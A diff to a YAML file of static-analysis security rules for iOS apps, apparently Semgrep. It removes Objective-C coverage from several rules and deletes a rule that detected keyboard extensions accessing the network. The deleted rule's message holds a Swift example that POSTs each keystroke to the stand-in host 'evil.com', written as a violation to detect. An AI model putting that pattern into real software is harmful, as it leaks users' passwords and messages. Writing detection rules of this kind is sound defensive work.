@@ -92,7 +92,6 @@ rules:
     severity: ERROR
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-311: Missing Encryption of Sensitive Data"
@@ -150,7 +149,6 @@ rules:
     severity: ERROR
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-311: Missing Encryption of Sensitive Data"
@@ -260,7 +258,6 @@ rules:
     severity: ERROR
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-524: Use of Cache Containing Sensitive Information"
@@ -317,7 +314,6 @@ rules:
     severity: WARNING
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-524: Use of Cache Containing Sensitive Information"
@@ -422,7 +418,6 @@ rules:
     severity: ERROR
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-359: Exposure of Private Personal Information"
@@ -460,7 +455,6 @@ rules:
     severity: WARNING
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-359: Exposure of Private Personal Information"
@@ -579,7 +573,6 @@ rules:
     severity: ERROR
     languages:
       - swift
-      - objc
     metadata:
       category: security
       cwe: "CWE-922: Insecure Storage of Sensitive Information"
@@ -590,88 +583,3 @@ rules:
 
   # ============ APP EXTENSIONS SECURITY ============
 
-  - id: hacktricks-ios-keyboard-extension-network
-    patterns:
-      - pattern-either:
-          - pattern: |
-              class $NAME: UIInputViewController {
-                ...
-                URLSession.$METHOD(...)
-                ...
-              }
-          - pattern: |
-              class $NAME: UIInputViewController {
-                ...
-                $SESSION.dataTask(...)
-                ...
-              }
-    message: |
-      Keyboard extension accessing network (HackTricks Critical Privacy Violation).
-      Keyboard extensions that access the network can exfiltrate user keystrokes.
-
-      Example violation:
-      ```swift
-      import UIKit
-
-      class KeyboardViewController: UIInputViewController {
-          func keyPressed(_ key: String) {
-              // DANGEROUS: Sending keystrokes to server
-              let url = URL(string: "https://evil.com/log")!
-              var request = URLRequest(url: url)
-              request.httpMethod = "POST"
-              request.httpBody = key.data(using: .utf8)
-
-              URLSession.shared.dataTask(with: request).resume()
-          }
-      }
-      ```
-
-      Why this is CRITICAL:
-      - Captures ALL user typing (passwords, credit cards, messages, emails)
-      - Violates user privacy expectations
-      - Violates App Store Review Guidelines
-      - May be malware/spyware
-
-      App Store Guidelines:
-      > Keyboard extensions must not access the network, or they will be rejected.
-
-      Exceptions (requires RequestsOpenAccess = YES):
-      - Must explicitly request "Full Access" from user
-      - User must explicitly grant permission
-      - Should only be used for legitimate features (e.g., GIF search)
-
-      Secure keyboard extension:
-      ```swift
-      class KeyboardViewController: UIInputViewController {
-          // NO network access
-          // NO URLSession
-          // Process everything locally
-
-          func keyPressed(_ key: String) {
-              // Local processing only
-              textDocumentProxy.insertText(key)
-          }
-      }
-      ```
-
-      Info.plist for open access (if needed):
-      ```xml
-      <key>NSExtension</key>
-      <dict>
-          <key>RequestsOpenAccess</key>
-          <true/>  <!-- User MUST approve -->
-      </dict>
-      ```
-
-      This will be REJECTED by App Store unless clearly justified!
-    severity: ERROR
-    languages:
-      - swift
-      - objc
-    metadata:
-      category: security
-      cwe: "CWE-359: Exposure of Private Personal Information"
-      owasp-mobile-2024: "M6: Inadequate Privacy Controls"
-      confidence: HIGH
-      source: "Ivan Sincek"
-      priority: "P1"
